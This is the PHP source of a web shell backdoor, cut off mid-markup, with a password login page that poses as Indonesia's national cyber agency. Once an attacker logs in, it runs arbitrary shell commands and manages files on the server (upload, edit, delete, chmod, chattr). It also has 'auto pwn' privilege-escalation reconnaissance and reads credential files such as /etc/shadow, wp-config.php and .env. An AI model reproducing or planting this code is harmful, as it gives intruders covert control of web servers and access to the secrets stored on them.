?><?php
error_reporting(0);
session_start();

// Konfigurasi
define('LOGIN_PASSWORD_HASH', '$2a$12$Uu3hxIJl1U.KvdyoHHyTIeP4nxWBr15zlX9D.uSTdPqYcZtH/NFZO');
define('SESSION_TIMEOUT', 3600); // 1 jam dalam detik

// Cek timeout session
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > SESSION_TIMEOUT)) {
    session_unset();
    session_destroy();
    session_start();
}

// Update waktu aktivitas terakhir
$_SESSION['last_activity'] = time();

// Fungsi logout
if (isset($_GET['logout'])) {
    session_unset();
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit();
}

// Cek apakah user sudah login
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    $error_message = '';
    
    // Proses login
    if (isset($_POST['password']) && !empty($_POST['password'])) {
        if (password_verify($_POST['password'], LOGIN_PASSWORD_HASH)) {
            $_SESSION['loggedin'] = true;
            $_SESSION['last_activity'] = time();
            
            // Redirect untuk mencegah resubmit
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit();
        } else {
            $error_message = 'Password salah!';
        }
    }
    
    // Tampilkan halaman login
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login - Badan Siber Dan Sandi Negara</title>
        <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body { 
                font-family: 'Montserrat', sans-serif; 
                display: flex; 
                justify-content: center; 
                align-items: center; 
                min-height: 100vh; 
                background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
                background-attachment: fixed;
                position: relative;
                overflow: hidden;
            }
            
            /* Animated background */
            body::before {
                content: '';
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="%23333" stroke-width="0.5" opacity="0.3"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)"/></svg>') repeat;
                animation: drift 20s infinite linear;
                z-index: -1;
            }
            
            @keyframes drift {
                0% { transform: translate(0, 0); }
                100% { transform: translate(-10px, -10px); }
            }
            
            .login-container { 
                max-width: 420px; 
                width: 90%; 
                padding: 40px 30px; 
                background: rgba(34, 34, 34, 0.95); 
                backdrop-filter: blur(10px);
                border: 1px solid rgba(194, 0, 255, 0.3);
                box-shadow: 
                    0 8px 32px rgba(0, 0, 0, 0.3),
                    0 0 0 1px rgba(194, 0, 255, 0.1),
                    inset 0 1px 0 rgba(255, 255, 255, 0.1);
                border-radius: 16px; 
                text-align: center;
                position: relative;
                animation: slideUp 0.6s ease-out;
            }
            
            @keyframes slideUp {
                from {
                    opacity: 0;
                    transform: translateY(30px);
                }
                to {
                    opacity: 1;
                    transform: translateY(0);
                }
            }
            
            .login-container::before {
                content: '';
                position: absolute;
                top: -2px;
                left: -2px;
                right: -2px;
                bottom: -2px;
                background: linear-gradient(45deg, #c200ff, #00cc66, #c200ff);
                border-radius: 16px;
                z-index: -1;
                animation: glow 3s ease-in-out infinite alternate;
                opacity: 0.6;
            }
            
            @keyframes glow {
                0% { opacity: 0.3; }
                100% { opacity: 0.6; }
            }
            
            .logo {
                margin-bottom: 30px;
            }
            
            .logo i {
                font-size: 48px;
                color: #c200ff;
                margin-bottom: 15px;
                display: block;
                text-shadow: 0 0 20px rgba(194, 0, 255, 0.5);
            }
            
            .login-container h3 { 
                margin-bottom: 30px; 
                color: #fff;
                font-weight: 600;
                font-size: 18px;
                line-height: 1.4;
            }
            
            .form-group {
                position: relative;
                margin-bottom: 25px;
                text-align: left;
            }
            
            .form-group i {
                position: absolute;
                left: 15px;
                top: 50%;
                transform: translateY(-50%);
                color: #c200ff;
                z-index: 2;
            }
            
            .login-container input[type="password"] { 
                width: 100%; 
                padding: 15px 15px 15px 45px; 
                border: 2px solid rgba(194, 0, 255, 0.3); 
                border-radius: 8px; 
                background: rgba(51, 51, 51, 0.8);
                color: #fff; 
                font-size: 16px;
                transition: all 0.3s ease;
                outline: none;
            }
            
            .login-container input[type="password"]:focus { 
                border-color: #c200ff;
                box-shadow: 0 0 0 3px rgba(194, 0, 255, 0.1);
                background: rgba(51, 51, 51, 0.9);
            }
            
            .login-container input[type="password"]::placeholder {
                color: #aaa;
            }
            
            .login-btn { 
                background: linear-gradient(135deg, #c200ff 0%, #a000d9 100%);
                color: white; 
                padding: 15px 30px; 
                border: none; 
                border-radius: 8px; 
                cursor: pointer; 
                width: 100%; 
                font-size: 16px;
                font-weight: 600;
                transition: all 0.3s ease;
                text-transform: uppercase;
                letter-spacing: 0.5px;
                position: relative;
                overflow: hidden;
            }
            
            .login-btn::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
                transition: left 0.5s;
            }
            
            .login-btn:hover::before {
                left: 100%;
            }
            
            .login-btn:hover { 
                background: linear-gradient(135deg, #00cc66 0%, #00a652 100%);
                transform: translateY(-2px);
                box-shadow: 0 8px 25px rgba(0, 204, 102, 0.3);
            }
            
            .login-btn:active {
                transform: translateY(0);
            }
            
            .error-message {
                background: rgba(255, 74, 74, 0.1);
                border: 1px solid rgba(255, 74, 74, 0.3);
                color: #ff4a4a;
                padding: 12px;
                border-radius: 6px;
                margin-bottom: 20px;
                font-size: 14px;
                animation: shake 0.5s ease-in-out;
            }
            
            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                25% { transform: translateX(-5px); }
                75% { transform: translateX(5px); }
            }
            
            .footer-text {
                margin-top: 25px;
                color: #888;
                font-size: 12px;
            }
            
            /* Responsive */
            @media (max-width: 480px) {
                .login-container {
                    padding: 30px 20px;
                    margin: 20px;
                }
                
                .logo i {
                    font-size: 40px;
                }
                
                .login-container h3 {
                    font-size: 16px;
                }
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">
                <i class="fas fa-shield-alt"></i>
            </div>
            
            <h3>Badan Siber Dan Sandi Negara<br>Sistem Keamanan Terintegrasi</h3>
            
            <?php if (!empty($error_message)): ?>
                <div class="error-message">
                    <i class="fas fa-exclamation-triangle"></i>
                    <?php echo htmlspecialchars($error_message); ?>
                </div>
            <?php endif; ?>
            
            <form method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
                <div class="form-group">
                    <i class="fas fa-lock"></i>
                    <input type="password" name="password" placeholder="Masukkan Password" required autocomplete="current-password">
                </div>
                
                <button type="submit" class="login-btn">
                    <i class="fas fa-sign-in-alt"></i> Masuk Sistem
                </button>
            </form>
            
            <div class="footer-text">
                Akses terbatas hanya untuk personel yang berwenang
            </div>
        </div>
        
        <script>
            // Auto focus pada input password
            document.querySelector('input[name="password"]').focus();
            
            // Enter key handler
            document.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    document.querySelector('form').submit();
                }
            });
        </script>
    </body>
    </html>
    <?php
    exit;
}

// ============ BAGIAN UTAMA APLIKASI SETELAH LOGIN ============

// Set konstanta dan variabel
$SHELL_VERSION = "v2.0";
$doc_root = $_SERVER['DOCUMENT_ROOT'];

// Path handling
if (!defined('PATH')) {
    if (isset($_GET['p'])) {
        $path = realpath(urldecode($_GET['p']));
        if ($path === false) {
            $path = getcwd();
        }
    } else {
        $path = getcwd();
    }
    define('PATH', $path);
}

// Message handling
$message = '';
$message_type = 'success';
$action_result_output = '';

// Helper functions
function encodePath($path) {
    return $path;
}

function formatSizeUnits($bytes) {
    if ($bytes >= 1073741824) {
        $bytes = number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        $bytes = number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        $bytes = number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        $bytes = $bytes . ' bytes';
    } elseif ($bytes == 1) {
        $bytes = $bytes . ' byte';
    } else {
        $bytes = '0 bytes';
    }
    return $bytes;
}

function perms_to_string($perms) {
    if ($perms === false) return '----------';
    
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function fileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'php' => '<i class="fab fa-php hacker-icon-code"></i> ',
        'html' => '<i class="fab fa-html5 hacker-icon-code"></i> ',
        'htm' => '<i class="fab fa-html5 hacker-icon-code"></i> ',
        'css' => '<i class="fab fa-css3 hacker-icon-code"></i> ',
        'js' => '<i class="fab fa-js hacker-icon-code"></i> ',
        'txt' => '<i class="fas fa-file-alt hacker-icon-text"></i> ',
        'log' => '<i class="fas fa-file-alt hacker-icon-text"></i> ',
        'conf' => '<i class="fas fa-cog hacker-icon-config"></i> ',
        'config' => '<i class="fas fa-cog hacker-icon-config"></i> ',
        'jpg' => '<i class="fas fa-image hacker-icon-image"></i> ',
        'jpeg' => '<i class="fas fa-image hacker-icon-image"></i> ',
        'png' => '<i class="fas fa-image hacker-icon-image"></i> ',
        'gif' => '<i class="fas fa-image hacker-icon-image"></i> ',
        'bmp' => '<i class="fas fa-image hacker-icon-image"></i> ',
        'svg' => '<i class="fas fa-image hacker-icon-image"></i> ',
        'zip' => '<i class="fas fa-file-archive hacker-icon-archive"></i> ',
        'rar' => '<i class="fas fa-file-archive hacker-icon-archive"></i> ',
        'tar' => '<i class="fas fa-file-archive hacker-icon-archive"></i> ',
        'gz' => '<i class="fas fa-file-archive hacker-icon-archive"></i> ',
        '7z' => '<i class="fas fa-file-archive hacker-icon-archive"></i> ',
        'pdf' => '<i class="fas fa-file-pdf hacker-icon-doc"></i> ',
        'doc' => '<i class="fas fa-file-word hacker-icon-doc"></i> ',
        'docx' => '<i class="fas fa-file-word hacker-icon-doc"></i> ',
        'xls' => '<i class="fas fa-file-excel hacker-icon-doc"></i> ',
        'xlsx' => '<i class="fas fa-file-excel hacker-icon-doc"></i> ',
        'mp3' => '<i class="fas fa-music hacker-icon-audio"></i> ',
        'wav' => '<i class="fas fa-music hacker-icon-audio"></i> ',
        'ogg' => '<i class="fas fa-music hacker-icon-audio"></i> ',
        'mp4' => '<i class="fas fa-video hacker-icon-video"></i> ',
        'avi' => '<i class="fas fa-video hacker-icon-video"></i> ',
        'mkv' => '<i class="fas fa-video hacker-icon-video"></i> ',
        'mov' => '<i class="fas fa-video hacker-icon-video"></i> ',
    ];
    
    return isset($icons[$ext]) ? $icons[$ext] : '<i class="fas fa-file hacker-icon-default"></i> ';
}

// Process POST actions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Upload file
    if (isset($_POST['upload']) && isset($_FILES['fileToUpload'])) {
        $target_file = PATH . '/' . basename($_FILES['fileToUpload']['name']);
        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $target_file)) {
            $message = 'File berhasil diupload!';
            $message_type = 'success';
        } else {
            $message = 'Error uploading file!';
            $message_type = 'error';
        }
    }
    
    // Create new file
    if (isset($_POST['create_file']) && isset($_POST['file_name']) && !empty($_POST['file_name'])) {
        $new_file = PATH . '/' . $_POST['file_name'];
        if (!file_exists($new_file)) {
            if (file_put_contents($new_file, '') !== false) {
                $message = 'File "' . $_POST['file_name'] . '" berhasil dibuat!';
                $message_type = 'success';
            } else {
                $message = 'Error creating file!';
                $message_type = 'error';
            }
        } else {
            $message = 'File sudah ada!';
            $message_type = 'error';
        }
    }
    
    // Create new folder
    if (isset($_POST['create_folder']) && isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        $new_folder = PATH . '/' . $_POST['folder_name'];
        if (!file_exists($new_folder)) {
            if (mkdir($new_folder, 0755)) {
                $message = 'Folder "' . $_POST['folder_name'] . '" berhasil dibuat!';
                $message_type = 'success';
            } else {
                $message = 'Error creating folder!';
                $message_type = 'error';
            }
        } else {
            $message = 'Folder sudah ada!';
            $message_type = 'error';
        }
    }
    
    // Edit file
    if (isset($_POST['edit']) && isset($_POST['file_to_save']) && isset($_POST['data'])) {
        $file_path = PATH . '/' . $_POST['file_to_save'];
        if (file_put_contents($file_path, $_POST['data']) !== false) {
            $message = 'File berhasil disimpan!';
            $message_type = 'success';
        } else {
            $message = 'Error saving file!';
            $message_type = 'error';
        }
    }
    
    // Rename file/folder
    if (isset($_POST['rename']) && isset($_POST['original_name']) && isset($_POST['new_name'])) {
        $old_path = PATH . '/' . $_POST['original_name'];
        $new_path = PATH . '/' . $_POST['new_name'];
        if (rename($old_path, $new_path)) {
            $message = 'Berhasil direname!';
            $message_type = 'success';
        } else {
            $message = 'Error renaming!';
            $message_type = 'error';
        }
    }
    
    // Run command
    if (isset($_POST['run_command']) && isset($_POST['command'])) {
        $command = $_POST['command'];
        $output = shell_exec($command . ' 2>&1');
        $action_result_output = htmlspecialchars($output ?: 'No output');
    }
    
    // System analysis
    if (isset($_POST['analyze_system'])) {
        $commands = [
            'uname -a',
            'cat /etc/passwd | head -10',
            'ps aux | head -10',
            'netstat -tulnp | head -10',
            'which gcc g++ python python3 perl ruby',
            'find / -perm -4000 2>/dev/null | head -10'
        ];
        
        $output = "=== SYSTEM ANALYSIS ===\n\n";
        foreach ($commands as $cmd) {
            $output .= "[$cmd]\n";
            $result = shell_exec($cmd . ' 2>&1');
            $output .= $result ? $result : 'No output';
            $output .= "\n" . str_repeat('-', 50) . "\n";
        }
        $action_result_output = htmlspecialchars($output);
    }
    
    // Auto pwn attempt
    if (isset($_POST['attempt_autopwn'])) {
        $commands = [
            'sudo -l',
            'find / -perm -4000 2>/dev/null',
            'crontab -l',
            'cat /etc/crontab',
            'ls -la /var/spool/cron/crontabs/',
            'ps aux | grep root'
        ];
        
        $output = "=== AUTO PWN ATTEMPT ===\n\n";
        foreach ($commands as $cmd) {
            $output .= "[$cmd]\n";
            $result = shell_exec($cmd . ' 2>&1');
            $output .= $result ? $result : 'Command failed or no output';
            $output .= "\n" . str_repeat('-', 50) . "\n";
        }
        $action_result_output = htmlspecialchars($output);
    }
}

// Process GET actions
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // Delete file/folder
    if (isset($_GET['d']) && isset($_GET['file'])) {
        $file_to_delete = PATH . '/' . urldecode($_GET['file']);
        if (is_file($file_to_delete)) {
            if (unlink($file_to_delete)) {
                $message = 'File berhasil dihapus!';
                $message_type = 'success';
            } else {
                $message = 'Error deleting file!';
                $message_type = 'error';
            }
        } elseif (is_dir($file_to_delete)) {
            if (rmdir($file_to_delete)) {
                $message = 'Folder berhasil dihapus!';
                $message_type = 'success';
            } else {
                $message = 'Error deleting folder! (Folder harus kosong)';
                $message_type = 'error';
            }
        }
    }
    
    // Download file
    if (isset($_GET['dl']) && isset($_GET['file'])) {
        $file_to_download = PATH . '/' . urldecode($_GET['file']);
        if (is_file($file_to_download) && is_readable($file_to_download)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file_to_download));
            readfile($file_to_download);
            exit();
        }
    }
    
    // Change permissions
    if (isset($_GET['chmod']) && isset($_GET['file'])) {
        $file_path = PATH . '/' . urldecode($_GET['file']);
        $perms = $_GET['chmod'];
        if (chmod($file_path, octdec($perms))) {
            $message = 'Permissions berhasil diubah!';
            $message_type = 'success';
        } else {
            $message = 'Error changing permissions!';
            $message_type = 'error';
        }
    }
    
    // chattr command
    if (isset($_GET['chattr']) && isset($_GET['file'])) {
        $file_path = PATH . '/' . urldecode($_GET['file']);
        $action = $_GET['chattr'];
        $cmd = ($action == 'lock') ? "chattr +i '$file_path'" : "chattr -i '$file_path'";
        $result = shell_exec($cmd . ' 2>&1');
        if (strpos($result, 'Operation not permitted') === false) {
            $message = 'chattr command executed!';
            $message_type = 'success';
        } else {
            $message = 'chattr failed: ' . $result;
            $message_type = 'error';
        }
    }
    
    // Read config files
    if (isset($_GET['read_config'])) {
        $config_files = [
            'passwd' => '/etc/passwd',
            'shadow' => '/etc/shadow',
            'wpconfig' => PATH . '/wp-config.php',
            'wpconfig_up' => dirname(PATH) . '/wp-config.php',
            'env' => PATH . '/.env',
            'env_up' => dirname(PATH) . '/.env',
            'apache_conf' => '/etc/apache2/apache2.conf',
            'nginx_conf' => '/etc/nginx/nginx.conf',
            'php_ini' => '/etc/php/7.4/apache2/php.ini'
        ];
        
        $config_type = $_GET['read_config'];
        if (isset($config_files[$config_type])) {
            $file_path = $config_files[$config_type];
            $content = @file_get_contents($file_path);
            if ($content !== false) {
                $action_result_output = htmlspecialchars($content);
            } else {
                $action_result_output = "Could not read file: $file_path";
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>0xTeam SHELL VİP<?php echo $SHELL_VERSION; ?> [DEBUG]</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
    <style>
         @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
        :root { --bg-color: #0a0a0a; --terminal-bg: #1a1a1a; --text-color: #00ff00; --header-color: #ff003c; --link-color: #00ffff; --link-hover: #ffffff; --border-color: #333; --icon-color: #ff003c; --button-bg: #ff003c; --button-text: #000; --button-hover-bg: #ff4d6d; --table-header-bg: #2a2a2a; --code-bg: #050505; --hacker-font: 'Fira Code', monospace; --perms-color: #aaaaaa; }
        body { background-color: var(--bg-color); color: var(--text-color); font-family: var(--hacker-font); margin: 0; padding: 0; font-size: 14px; line-height: 1.6; overflow-x: hidden; }
        .container-fluid { padding: 15px; max-width: 1600px; margin: 0 auto; }
        .hacker-nav { background-color: var(--terminal-bg); border-bottom: 2px solid var(--header-color); padding: 8px 15px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
        .navbar-brand { color: var(--header-color); font-weight: bold; font-size: 1.3em; text-shadow: 0 0 5px var(--header-color); } .navbar-brand i { margin-right: 8px; }
        .navbar-brand a, .breadcrumb a { color: var(--link-color); text-decoration: none; margin: 0 2px; } .navbar-brand a:hover, .breadcrumb a:hover { color: var(--link-hover); text-decoration: underline; }
        .breadcrumb { background: var(--terminal-bg); padding: 8px 12px; margin-bottom:15px; border: 1px solid var(--border-color); border-radius: 3px; word-break: break-all; color: var(--text-color); font-size: 0.9em; } .breadcrumb i { margin-right: 5px; color: var(--header-color); }
        .hacker-controls a button, .hacker-controls input[type="submit"], .quick-cmd-btn, .action-btn, .config-btn { background-color: var(--button-bg); color: var(--button-text); border: none; padding: 4px 8px; margin-left: 8px; cursor: pointer; font-family: var(--hacker-font); font-weight: bold; transition: background-color 0.3s ease; border-radius: 3px; font-size: 0.85em; margin-bottom: 5px; }
        .hacker-controls a button:hover, .hacker-controls input[type="submit"]:hover, .quick-cmd-btn:hover, .action-btn:hover, .config-btn:hover { background-color: var(--button-hover-bg); } .hacker-controls i { margin-right: 4px;}
        .logout-btn { background-color: #dc3545; color: white; padding: 5px 10px; border: none; border-radius: 3px; cursor: pointer; text-decoration: none; font-size: 0.85em; margin-left: 8px; }
        .logout-btn:hover { background-color: #c82333; }
        .hacker-table { width: 100%; border-collapse: collapse; margin-top: 15px; background-color: var(--terminal-bg); border: 1px solid var(--border-color); box-shadow: 0 0 10px rgba(255, 0, 60, 0.2); }
        .hacker-table th, .hacker-table td { border: 1px solid var(--border-color); padding: 6px 10px; text-align: left; vertical-align: middle; word-break: break-all; font-size: 0.9em; }
        .hacker-table th { background-color: var(--table-header-bg); color: var(--header-color); font-weight: bold; }
        .hacker-table tr:nth-child(even) { background-color: rgba(0, 255, 0, 0.03); } .hacker-table tr:hover { background-color: rgba(0, 255, 255, 0.08); }
        .hacker-table td a { color: var(--link-color); text-decoration: none; margin-right: 6px; display: inline-block; position: relative; } .hacker-table td a:hover { color: var(--link-hover); }
        .hacker-table td a .tooltiptext { visibility: hidden; width: 80px; background-color: #555; color: #fff; text-align: center; border-radius: 6px; padding: 5px 0; position: absolute; z-index: 1; bottom: 125%; left: 50%; margin-left: -40px; opacity: 0; transition: opacity 0.3s; font-size: 0.8em; } .hacker-table td a:hover .tooltiptext { visibility: visible; opacity: 1; }
        .hacker-icon-folder { color: #ffff00; } .hacker-icon-error { color: #ff4d4d; } .hacker-icon-config { color: #cccccc; } .hacker-icon-code { color: #66ccff; } .hacker-icon-image { color: #cc99ff; } .hacker-icon-audio { color: #ff99cc; } .hacker-icon-video { color: #ffcc66; } .hacker-icon-text { color: #ffffff; } .hacker-icon-archive { color: #99ff99; } .hacker-icon-doc { color: #ffad33; } .hacker-icon-default { color: var(--text-color); } .hacker-icon-lock { color: #f0ad4e; } .hacker-icon-anchor { color: #d9534f; }
        .perms { color: var(--perms-color); font-size: 0.9em; cursor: help; }
        form { margin-bottom: 15px; }
        .form-section { background-color: var(--terminal-bg); padding: 15px; margin-top: 15px; border: 1px solid var(--border-color); border-radius: 5px; } .form-section h3 { font-size: 1.1em; margin-bottom: 10px; color: var(--header-color);}
        input[type="file"], input[type="text"], textarea, select { background-color: var(--code-bg); color: var(--text-color); border: 1px solid var(--border-color); padding: 6px; margin: 4px 0; width: calc(100% - 18px); font-family: var(--hacker-font); border-radius: 3px; font-size: 0.9em; }
        textarea { min-height: 250px; resize: vertical; } select { width: auto; }
        .message { padding: 8px 12px; margin: 12px 0; border-radius: 3px; font-weight: bold; border: 1px solid transparent; font-size: 0.9em;} .message.success { background-color: rgba(0, 255, 0, 0.1); border-color: var(--text-color); color: var(--text-color); text-shadow: 0 0 3px var(--text-color); } .message.error { background-color: rgba(255, 0, 60, 0.1); border-color: var(--header-color); color: var(--header-color); text-shadow: 0 0 3px var(--header-color); } .message i { margin-right: 6px; }
        .command-section, .collapsible-section { background-color: var(--terminal-bg); border: 1px solid var(--border-color); padding: 15px; margin-top: 20px; border-radius: 5px; }
        .collapsible-section summary { color: var(--header-color); font-size: 1.1em; margin-bottom: 10px; cursor: pointer; font-weight: bold; list-style: none; }
        .collapsible-section summary::-webkit-details-marker { display: none; }
        .collapsible-section summary::before { content: '\f078'; font-family: 'Font Awesome 6 Free'; font-weight: 900; margin-right: 8px; display: inline-block; transition: transform 0.2s; }
        .collapsible-section[open] summary::before { transform: rotate(-180deg); }
        .collapsible-section[open] summary { border-bottom: 1px solid var(--header-color); padding-bottom: 5px; }
        .command-section h3, .collapsible-section h4 { color: var(--header-color); font-size: 1.1em; margin-bottom: 10px; }
        .command-form { display: flex; margin-bottom: 10px;} .command-form input[type="text"] { flex-grow: 1; margin-right: 10px; }
        .quick-cmd-buttons button, .config-btn { margin-right: 5px; margin-bottom: 5px;}
        pre.command-output, pre.info-output { background-color: var(--code-bg); color: var(--text-color); border: 1px solid var(--border-color); padding: 10px; margin-top: 10px; border-radius: 3px; white-space: pre-wrap; word-wrap: break-word; max-height: 400px; overflow-y: auto; font-size: 0.9em; }
        .hacker-footer { text-align: center; margin-top: 30px; padding: 10px; color: #555; font-size: 0.85em; border-top: 1px solid var(--border-color); } .hacker-footer a { color: var(--link-color); text-decoration: none; } .hacker-footer a:hover { color: var(--link-hover); }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } } @keyframes glow { 0% { text-shadow: 0 0 3px var(--header-color), 0 0 5px var(--header-color); } 50% { text-shadow: 0 0 8px var(--header-color), 0 0 15px var(--header-color); } 100% { text-shadow: 0 0 3px var(--header-color), 0 0 5px var(--header-color); } }
        .navbar-brand span { animation: glow 2.5s infinite alternate; } body { animation: fadeIn 0.8s ease-out; }
        @media (max-width: 768px) { .hacker-nav { flex-direction: column; align-items: flex-start;} .hacker-controls { margin-top: 10px; width: 100%; text-align: right;} .hacker-table th, .hacker-table td { padding: 5px 6px; font-size: 0.85em;} .hacker-table td a { margin-right: 4px;} textarea { min-height: 200px; } .hacker-table td:nth-child(2), .hacker-table th:nth-child(2), .hacker-table td:nth-child(3), .hacker-table th:nth-child(3) { display: none; } .command-form { flex-direction: column;} .command-form input[type="text"] { margin-right: 0; margin-bottom: 5px;} }
    </style>
</head>
<body>
    <div class="container-fluid">

        <nav class="hacker-nav">
             <div class="navbar-brand">
                 <i class="fas fa-meteor"></i>
                 <span id="shell-title"></span>
             </div>
             <div class="hacker-controls">
                 <a href="?upload=1&p=<?php echo urlencode(encodePath(PATH)); ?>"><button type="button"><i class="fas fa-upload"></i> Upload</button></a>
                 <a href="?create_file=1&p=<?php echo urlencode(encodePath(PATH)); ?>"><button type="button"><i class="fas fa-file-plus"></i> New File</button></a>
                 <a href="?create_folder=1&p=<?php echo urlencode(encodePath(PATH)); ?>"><button type="button"><i class="fas fa-folder-plus"></i> New Folder</button></a>
                 <a href="?p=<?php echo encodePath('/'); ?>"><button type="button"><i class="fas fa-broadcast-tower"></i> ROOT</button></a>
                 <a href="?p=<?php echo urlencode(encodePath($doc_root)); ?>"><button type="button"><i class="fas fa-sitemap"></i> WebRoot</button></a>
                 <a href="?logout=1" class="logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</a>
             </div>
        </nav>

        <div class="breadcrumb">
            <i class="fas fa-folder"></i> Path: <?php 
            $path_for_breadcrumb = PATH; 
            $path_for_breadcrumb = str_replace('\\', '/', $path_for_breadcrumb); 
            if (empty($path_for_breadcrumb) || $path_for_breadcrumb === '/') { 
                echo "<a href=\"?p=" . encodePath('/') . "\">/</a>"; 
            } else { 
                $paths = explode('/', $path_for_breadcrumb); 
                $current_built_path = ''; 
                $is_windows_path = preg_match('/^[a-zA-Z]:$/', isset($paths[0]) ? $paths[0] : ''); 
                foreach ($paths as $id => $dir_part) { 
                    if ($dir_part === '' && $id === 0 && !$is_windows_path) { 
                        $current_built_path = '/'; 
                        echo "<a href=\"?p=" . encodePath($current_built_path) . "\">/</a>"; 
                        continue; 
                    } 
                    if ($is_windows_path && $id === 0) { 
                        $current_built_path = $dir_part . '/'; 
                        echo "<a href=\"?p=" . encodePath($current_built_path) . "\">" . htmlspecialchars($dir_part) . "</a>/"; 
                        continue; 
                    } 
                    if ($dir_part === '') continue; 
                    if ($current_built_path === '/' || preg_match('/\/$/', $current_built_path)) { 
                        $current_built_path .= $dir_part; 
                    } else { 
                        $current_built_path .= '/' . $dir_part; 
                    } 
                    echo "<a href='?p=" . encodePath($current_built_path) . "'>" . htmlspecialchars($dir_part) . "</a>/"; 
                } 
            } ?>
        </div>

        <?php if (!empty($message)): ?>
            <div class="message <?php echo $message_type; ?>">
                <i class="fas fa-info-circle"></i> <?php echo htmlspecialchars($message); ?>
            </div>
        <?php endif; ?>

        <?php
        // Ana İçerik Alanı
        $show_file_manager = true;
        if (isset($_GET['upload']) || (isset($_GET['r']) && isset($_GET['file'])) || (isset($_GET['e']) && isset($_GET['file'])) || isset($_GET['create_file']) || isset($_GET['create_folder'])) {
             if (isset($_GET['upload'])) { 
                 echo '<div class="form-section"><h3><i class="fas fa-upload"></i> Upload to ' . htmlspecialchars(PATH) . '</h3><form method="post" enctype="multipart/form-data" action="?p='.urlencode(encodePath(PATH)).'"><input type="file" name="fileToUpload" id="fileToUpload" required><input type="submit" class="action-btn" value="Upload!" name="upload"></form></div>'; 
             }
             elseif (isset($_GET['create_file'])) {
                 echo '<div class="form-section"><h3><i class="fas fa-file-plus"></i> Create New File in ' . htmlspecialchars(PATH) . '</h3><form method="post" action="?p='.urlencode(encodePath(PATH)).'">File Name:<input type="text" name="file_name" placeholder="example.txt" required><input type="submit" class="action-btn" value="Create File!" name="create_file"></form></div>';
             }
             elseif (isset($_GET['create_folder'])) {
